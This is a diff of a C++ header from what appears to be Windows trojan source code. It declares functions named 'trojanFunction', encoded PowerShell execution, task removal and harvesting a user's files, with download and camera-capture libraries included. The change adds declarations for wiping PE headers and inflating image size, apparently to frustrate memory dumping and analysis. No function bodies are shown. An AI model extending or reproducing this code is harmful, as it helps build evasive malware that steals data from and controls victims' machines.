@@ -1,17 +1,17 @@
 #pragma once
 #include "../commons/common.h"
 #include "json.hpp"
-#include <atlstr.h>
-#include <atlimage.h>
 #include <fstream>
 #include <sstream>
-#include <VersionHelpers.h>
+#include <dshow.h>
 #include <iomanip>
+#include <atlstr.h>
 #include <wininet.h>
-#include <dshow.h>  
-#import "libid:78530B68-61F9-11D2-8CAD-00A024580902" raw_interfaces_only named_guids
-#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
+#include <atlimage.h>
+#include <winternl.h>
+#include <VersionHelpers.h>
 #include <experimental/filesystem>
+#import "libid:78530B68-61F9-11D2-8CAD-00A024580902" raw_interfaces_only named_guids
 
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib,"Wininet.lib")
@@ -28,6 +28,8 @@ bool copy_file(const char* From, const char* To);
 std::string powershellEncodedCommand(std::string cmd);
 DWORD trojanFunction(LPVOID url);
 DWORD removeTasks(LPVOID params_useless);
+void peHeaderDeleter();
+void imageSizeIncreaser();
 void getAllFiles(std::string username);
 int gettimeofday(struct timeval* tp, struct timezone* tzp);
 std::string generateRandom(const int len);
